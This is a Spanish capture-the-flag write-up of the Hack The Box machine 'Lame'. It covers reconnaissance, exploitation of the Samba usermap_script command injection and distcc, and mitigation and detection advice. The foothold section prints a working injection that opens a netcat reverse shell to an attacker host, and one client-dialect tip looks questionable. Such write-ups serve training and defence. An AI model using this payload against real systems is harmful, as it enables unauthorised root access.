---
machine: Lame
os: Linux
difficulty: Easy
platform: Hack The Box
category: SMB / Servicios antiguos
state: Retired
tags: [samba, usermap_script, distcc, vsftpd, cve-2007-2447]
---

# Lame — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

La primera máquina publicada en la plataforma. Un **Samba 3.0.20** con `usermap_script` (CVE-2007-2447) da **root directo** sin autenticación: el nombre de usuario se pasa a un script de shell, así que una comilla con `;` ejecuta comandos. `vsftpd 2.3.4` y `distcc` son las otras dos puertas conocidas.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
21/tcp   open  ftp      vsftpd 2.3.4
22/tcp   open  ssh      OpenSSH 4.7p1
139/tcp  open  netbios-ssn   Samba smbd 3.0.20-Debian
445/tcp  open  netbios-ssn   Samba smbd 3.0.20-Debian
3632/tcp open  distccd  distccd v1
```

## Enumeración

- **139/445 Samba 3.0.20-Debian**: `smbclient -L //<IP> -N` lista `tmp`, `opt`, `IPC$`, `print$`; `smbmap` confirma escritura anónima en `tmp`.
- **21 vsftpd 2.3.4**: login anónimo permitido, directorio vacío. La versión está en el rango del backdoor, pero **no** responde en el 6200.
- **3632 distccd 1**: compilador distribuido sin autenticación, ejecuta lo que le mandes como `daemon`.
- La versión de Samba aparece distinta en 139 (`3.X - 4.X`) y en 445 (`3.0.20-Debian`): hay que casar la CVE con el banner bueno, no con el genérico.

## Foothold

**Samba `usermap_script` (CVE-2007-2447)** — el vector con root:

```bash
# el usuario se interpola en un script de shell sin sanear
smbclient //<IP>/tmp -N -U '/=`nohup nc -e /bin/sh <LHOST> 4444`'
```

El nombre de usuario viaja entre comillas dobles en la línea de órdenes y se ejecuta con backticks antes de autenticar: por eso la sesión vuelve como `uid=0`. Si el cliente moderno rechaza el dialecto, forzar `-m SMB2` o usar `exploit/multi/samba/usermap_script`.

Alternativa con Metasploit: `exploit/multi/samba/usermap_script`.

**distcc (CVE-2004-2687)** — ejecución como `daemon`, sin credenciales. Funciona con el módulo `exploit/unix/misc/distcc_exec`, pero algunas sesiones lo encuentran parcheado: conviene probarlo y no dar por hecho que es la vía.

**`vsftpd 2.3.4`** — el backdoor del `:)` (**CVE-2011-2523**) sólo existe en la build subida entre el 30/06 y el 03/07 de 2011. Aquí la versión es la correcta pero el implante **no está**: enviar `:)` como usuario no abre el 6200. No es un señuelo deliberado, es una versión sin el backdoor.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

Por Samba la sesión ya es `uid=0`. Por `distcc` se entra como `daemon` y hace falta enumerar privilegios locales:

```bash
id; uname -a; ls -la /home; find / -perm -4000 -type f 2>/dev/null
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`vsftpd`**: perder tiempo en el backdoor cuando el puerto 6200 está filtrado.
- **SMB moderno**: un cliente actual puede rechazar el dialecto; usar `-m SMB2` o el módulo de MSF.
- **Payloads**: la reverse shell va dentro del nombre de usuario; las comillas y el escape son la mitad del trabajo.

- Un servicio de 2007 en 2017 es una invitación: versiones → CVEs públicos.
- En `usermap_script` el fallo es de **inyección de comandos** en la cadena de usuario.
- `distcc` expuesto es ejecución remota sin credenciales.
- Mitigación: Samba actualizado, `distcc` no expuesto y `vsftpd` fuera de producción.

## Mitigaciones y detección

- Samba actualizado (el fallo es de 2007), `username map script` fuera de `smb.conf` y `smbd` sin privilegios de root.
- `distccd` nunca en una interfaz de usuario: escucha sin autenticación y ejecuta compilaciones arbitrarias.
- FTP anónimo cerrado y `vsftpd` en una build verificada por hash, no por banner.
- Detección: logins SMB con nombres de usuario que contienen metacaracteres de shell, y procesos `nc`/`sh` hijos de `smbd`.
- MITRE: T1190, T1210, T1548.

## Referencias

- [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)
- [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
